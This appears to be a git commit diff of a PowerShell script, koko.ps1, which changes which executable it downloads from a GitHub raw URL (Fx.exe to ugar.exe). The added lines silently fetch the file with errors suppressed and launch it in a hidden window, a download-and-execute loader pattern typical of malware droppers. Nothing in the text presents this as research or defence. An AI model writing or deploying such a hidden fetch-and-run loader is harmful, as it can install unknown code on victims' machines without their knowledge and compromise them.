5bf3b7b45aa0a75aec8df4b4a25e58912a98de47
kilordow <petrovolosuk310@gmail.com>
2026-02-08 00:08:32 +0200

    Change download and execution from Fx.exe to ugar.exe

--- koko.ps1
+++ koko.ps1
@@ -1,4 +1,5 @@
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/ugar.exe" -OutFile "ugar.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
+    Start-Process -FilePath "ugar.exe" -WindowStyle Hidden
+
